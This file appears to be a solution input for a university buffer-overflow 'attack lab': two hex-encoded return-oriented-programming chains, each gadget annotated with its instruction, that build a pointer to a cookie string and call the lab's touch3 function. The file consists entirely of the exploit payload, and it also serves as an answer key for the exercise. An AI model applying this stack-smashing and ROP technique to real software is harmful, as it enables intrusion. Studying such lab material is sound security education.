36 36 37 36 65 31 64 62 00

90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
C2 19 40 00 00 00 00 00	# movq %rsp, %rax	
5C 19 40 00 00 00 00 00	# movq %rax, %rdi
50 19 40 00 00 00 00 00	# popq %rax
48 00 00 00 00 00 00 00
D5 19 40 00 00 00 00 00	# movl %eax, %ecx
B5 19 40 00 00 00 00 00	# movl %ecx, %edx
FC 19 40 00 00 00 00 00	# movl %edx, %esi
6C 19 40 00 00 00 00 00	# lea(%rdi, %rsi, 1), %rax 
55 19 40 00 00 00 00 00	# movq %rax, %rdi
A5 18 40 00 00 00 00 00	# touch3
36 36 37 36 65 31 64 62	# cookie
00

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00	# movq %rsp, %rax
a2 19 40 00 00 00 00 00	# movq %rax, %rdi
cc 19 40 00 00 00 00 00	# popq %rax
48 00 00 00 00 00 00 00	
dd 19 40 00 00 00 00 00	# movl %eax, %edx
70 1a 40 00 00 00 00 00	# movl %edx, %ecx
13 1a 40 00 00 00 00 00	# movl %ecx, %esi
d6 19 40 00 00 00 00 00	# lea(%rdi, %rsi, 1), %rax 
a2 19 40 00 00 00 00 00	# movq %rax, %rdi
fa 18 40 00 00 00 00 00	# touch3
35 39 62 39 39 37 66 61 00